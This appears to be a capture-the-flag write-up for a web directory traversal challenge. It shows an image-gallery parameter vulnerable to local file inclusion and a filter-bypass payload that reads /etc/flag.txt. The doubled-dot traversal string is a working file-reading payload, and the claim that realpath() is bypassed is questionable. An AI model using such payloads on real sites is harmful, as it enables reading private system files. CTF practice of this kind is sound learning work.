# Web Directory Traversal Challenge

## Challenge Description
Securing web directories is a common misconfiguration.
Please give me the flag located at /etc/flag.txt
Website: https://nm02.bootupctf.net:8082/

## Analysis
- Image gallery website with `picture.php?image=` parameter
- Vulnerable to Local File Inclusion (LFI)
- Uses `realpath()` function which can be bypassed with specific patterns

## Vulnerability
The application attempts to filter directory traversal but can be bypassed using:
`....//....//....//....//....//....//etc/flag.txt`

## Solution
Access the flag using the bypass payload:
```
https://nm02.bootupctf.net:8082/picture.php?image=....//....//....//....//....//....//etc/flag.txt
```

## Flag
`[REDACTED]`
